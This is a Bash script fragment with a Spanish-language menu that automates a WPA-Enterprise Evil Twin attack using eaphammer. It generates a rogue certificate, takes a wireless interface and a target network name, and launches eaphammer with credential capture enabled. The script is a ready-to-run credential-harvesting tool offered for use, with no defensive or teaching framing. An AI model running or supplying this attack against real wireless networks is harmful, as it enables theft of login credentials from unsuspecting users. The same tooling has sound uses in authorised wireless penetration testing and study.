until [ "$optport" = "4" ]
do

echo -e "\e[1;31m$(cat logport)\e[0m"
echo ""
echo -e "\033[31m[-] Menu de opciones: \033[0m"
echo ""
echo "[0] Crear el certificado de la red"
echo "[1] Seleccionar la estacion"
echo "[2] Escribir el nombre de la red a clonar"
echo "[3] Iniciar el Evil Twin"
echo "[4] Salir"
echo ""
read -p $'\e[33m[-] Elige una opcion: \e[0m ' optport

case $optport in

	0)
		echo ""
		echo -e "\033[32m[!] Creando el certificado de la red\033[0m"
		echo ""
		read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m ' ENTER
		echo ""
		sudo eaphammer --cert-wizard
		echo ""
		echo -e "\033[32m[!] Certificado de red creado\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m ' ENTER
		clear
	;;

        1)
                echo ""
                echo -e "\033[32m[!] A continuacion se mostraran las estaciones disponibles\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m ' ENTER
                echo ""
                ifconfig
                echo ""
                read -p $'\e[33m[-] Escriba el nombre de la estacion que desea utilizar: \e[0m ' stationPort
                echo ""
		echo -e "\033[32m[!] Estacion guardada correctamente\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m ' ENTER
                clear
        ;;

        2)
                echo ""
                read -p $'\e[33m[-] Escriba el nombre de la red que desea clonar: \e[0m ' essidname
                echo ""
                echo -e "\033[32m[!] Red guardada correctamente\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m ' ENTER
                clear
        ;;


        3)
                echo ""
                echo -e "\033[32m[!] Estas a punto de iniciar el ataque Evil Twin\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m ' ENTER
                echo ""
               	sudo eaphammer -i $stationPort --channel 4 --auth wpa-eap --essid $essidname --creds
                echo ""
                echo -e "\033[32m[!] Ataque realizado correctamente\033[0m"
                echo ""
                read -p $'\e[33m[-] Presione ENTER para continuar: \e[0m ' ENTER
                clear
        ;;

        4)
                clear
                echo -e "\033[32m[!] Volviendo al menu principal\033[0m"
                echo ""
        ;;


        *)
                clear
                echo -e "\033[31m[!] Opcion invalida, repita denuevo.\033[0m"
                echo ""
        ;;

esac

done
